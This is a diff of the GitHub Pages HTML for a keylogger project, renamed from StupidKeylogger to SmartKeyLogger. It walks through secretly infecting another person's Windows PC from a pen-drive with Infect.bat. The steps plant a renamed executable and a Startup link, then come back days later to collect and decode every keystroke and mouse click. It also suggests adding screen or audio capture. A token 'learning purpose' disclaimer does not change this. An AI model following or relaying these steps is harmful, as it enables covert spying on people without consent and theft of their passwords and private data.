@@ -3,12 +3,11 @@
   <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
-    <title>StupidKeylogger by MinhasKamal</title>
+    <title>SmartKeyLogger by MinhasKamal</title>
 
     <link rel="stylesheet" href="stylesheets/styles.css">
     <link rel="stylesheet" href="stylesheets/github-light.css">
     <meta name="viewport" content="width=device-width">
-    <link rel="icon" type="image/ico" href="https://assets-cdn.github.com/images/icons/emoji/unicode/1f511.png" />
     <!--[if lt IE 9]>
     <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
@@ -16,7 +15,7 @@
   <body>
     <div class="wrapper">
       <header>
-        <h1>StupidKeylogger</h1>
+        <h1>SmartKeyLogger</h1>
         <p>A Terrific Keystroke Recorder</p>
 
         <p class="view"><a href="https://github.com/MinhasKamal/StupidKeylogger">View the Project on GitHub <small>MinhasKamal/StupidKeylogger</small></a></p>
@@ -31,40 +30,54 @@
       <section>
         <p>This tacky program hides itself in the subject’s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.</p>
 
+<p><strong>This project is created only for learning purpose.</strong></p>
+
 <h3>
 <a id="how-to-use" class="anchor" href="#how-to-use" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>How to use?</h3>
 
 <ol>
-<li>Download the full package from <a href="https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip">here</a>, unzip it, and move it to your pen-drive. It should look like this-</li>
-</ol>
+<li>
+<p>Download the full package from <a href="https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip">here</a>, unzip it, and move it to your pen-drive. It should look something like this-</p>
 
 <div align="center">
-  <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger">
+ <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger">
 </div>
 
-<ol>
-<li><p><strong>WindowsShell.exe</strong> is the compiled and renamed form of <strong>Keylogger.cpp</strong> (of course you do not expect others to let you insert a pen-drive containing keylogger!). <strong>WindowsShell.lnk</strong> is a link file of <strong>WindowsShell.exe</strong>. Now insert your pen-drive in a computer, and run <strong>Infect.bat</strong>. This will install <strong>WindowsShell.exe</strong> and <strong>WindowsShell.lnk</strong> in that PC.</p></li>
-<li><p>Wait for some days, then return to the PC, and run <strong>CollectData.bat</strong>. You will get a file named <strong>Record.log</strong>.</p></li>
-<li><p>Now, simply run <strong>RecordDecoder.exe</strong> (do not rename <strong>Record.log</strong>). You will get another file- <strong>Data.log</strong>. Here you will get that you want.</p></li>
+<p><strong>WindowsShell.exe</strong> is the compiled and renamed form of <a href="https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp"><strong>Keylogger.cpp</strong></a>. Of course you do not expect others to let you insert a pen-drive containing keylogger; even if that is stupid! <strong>WindowsShell</strong> is the link file of <strong>WindowsShell.exe</strong>. </p>
+</li>
+<li><p>Insert your pen-drive in a computer and run <strong>Infect.bat</strong>. This will install <strong>WindowsShell.exe</strong> (in the <em>%appdata%</em> folder) &amp; <strong>WindowsShell.lnk</strong> (in <em>%appdata%\Microsoft\Windows\Start Menu\Programs\Startup</em>) in that PC, and start it. </p></li>
+<li>
+<p>Wait for some days (I know it is hard but be patient), then return to the PC, insert the pen-drive and run <strong>CollectData.bat</strong>. You will get a file named <strong>Record.log</strong>. This is what it contains-</p>
+
+<div align="center">
+ <img src="https://cloud.githubusercontent.com/assets/5456665/20914395/89d6b268-bba9-11e6-9586-dae692aa0405.png" alt="Record" width="600px" height="auto">
+</div>
+</li>
+<li>
+<p>Now, simply run <strong>RecordDecoder.exe</strong> (keep <strong>Record.log</strong> in the same folder &amp; do not rename it), and you will get <strong>Data.log</strong>. This file contains all the key-strokes and mouse-clicks. It is all up to you now to find necessary information from this (good luck with that!). </p>
+
+<div align="center">
+ <img src="https://cloud.githubusercontent.com/assets/5456665/20915077/d9e3ffbe-bbad-11e6-87f1-d7c079c3cfb7.png" alt="Data" width="600px" height="auto">
+</div>
+
+<p>You may use <a href="https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/RecordDecoderFocused.cpp"><strong>RecordDecoderFocused</strong></a> instead of <strong>RecordDecoder.exe</strong>, it will get rid of some unnecessary data automatically for you.</p>
+</li>
 <li><p>If you want to remove the Keylogger from that PC, run <strong>Cure.bat</strong>.</p></li>
 </ol>
 
 <p>Surely you can use it in many other ways; and also enhance its ability by adding a screen capturer, or sound recorder, and so on.</p>
 
-<p><strong>Note:</strong> I do not want newbies to abuse my project, so I am <strong>not revealing all the secrets</strong>. I will also not take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this. </p>
+<p><strong>Note:</strong> <em>I will also not take any responsibility of someone else's ill act with my program</em>. But I do believe that a real learner will learn a lot from this. </p>
 
 <p>This is actually a pre-project for <a href="https://github.com/MinhasKamal/TrojanCockroach">TrojanCockroach</a>.</p>
 
 <h3>
 <a id="license" class="anchor" href="#license" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>License</h3>
 
-<p><a href="https://opensource.org/licenses/MIT">
-<img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="65em" height=auto />
-</a>
-<br><a href="https://github.com/MinhasKamal/StupidKeylogger">StupidKeylogger</a> is licensed under a <a href="https://opensource.org/licenses/MIT">MIT License</a>.</p>
+<p><a href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height="auto/"></a><br><a href="https://github.com/MinhasKamal/StupidKeylogger">StupidKeylogger</a> is licensed under <a href="https://opensource.org/licenses/MIT">MIT License</a>.</p>
       </section>
       <footer>
-        <p>This project is maintained by <a href="https://github.com/MinhasKamal">MinhasKamal</a> (last updated: 01-Dec-2016)</p>
+        <p>This project is maintained by <a href="https://github.com/MinhasKamal">MinhasKamal</a></p>
         <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
       </footer>
     </div>
